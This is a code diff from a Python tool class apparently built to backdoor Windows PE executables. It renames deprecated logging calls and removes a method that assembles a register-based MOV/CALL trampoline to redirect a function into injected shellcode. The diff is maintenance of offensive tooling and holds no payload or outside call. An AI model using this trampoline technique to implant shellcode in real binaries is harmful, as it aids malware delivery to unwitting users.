@@ -45,10 +45,10 @@ class FunctionBackdoorer:
         it = IntervalTree()
         it.addi(addr, addr+len(compiled_trampoline))
         if it.overlap(shellcode_addr, shellcode_addr+shellcode_len):
-            logger.warn("Attempt to patch jump (0x{:X}-0x{:X}) to shellcode (0x{:X}-0x{:X}) but they overlap and probably dont work".format(
+            logger.warning("Attempt to patch jump (0x{:X}-0x{:X}) to shellcode (0x{:X}-0x{:X}) but they overlap and probably dont work".format(
                 addr, addr+len(compiled_trampoline), shellcode_addr, shellcode_addr+shellcode_len
             ))
-            logger.warn("Text section too small?")
+            logger.warning("Text section too small?")
 
         # write
         #logger.info("Trampoline: {}".format(compiled_trampoline))
@@ -108,34 +108,3 @@ class FunctionBackdoorer:
 
         return None
 
-
-    def get_trampoline(self, addr, shellcode_addr):
-        addrOffset = -1
-
-        if not self.superpe.is_64():
-            raise Exception("Not 64 bit")
-        reg = random.choice(['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi']).upper()
-        full_shellcode_addr = shellcode_addr + self.superpe.pe.OPTIONAL_HEADER.ImageBase 
-
-        enc, count = self.ks.asm(f'MOV {reg}, 0x{full_shellcode_addr:X}')
-        for instr2 in cs.disasm(bytes(enc), 0):
-            addrOffset = len(instr2.bytes) - instr2.addr_size
-            break
-
-        jump = random.choice([
-            f'CALL {reg}',
-
-            #
-            # During my tests I found that CALL reg works stabily all the time, whereas below two gadgets
-            # are known to crash on seldom occassions.
-            #
-
-            #f'JMP {reg}',
-            #f'PUSH {reg} ; RET',
-        ])
-
-        trampoline_text = f'MOV {reg}, 0x{full_shellcode_addr:X} ; {jump}'
-        trampoline_compiled, count = ks.asm(trampoline_text)
-
-        return trampoline_compiled, trampoline_text, addrOffset
-    
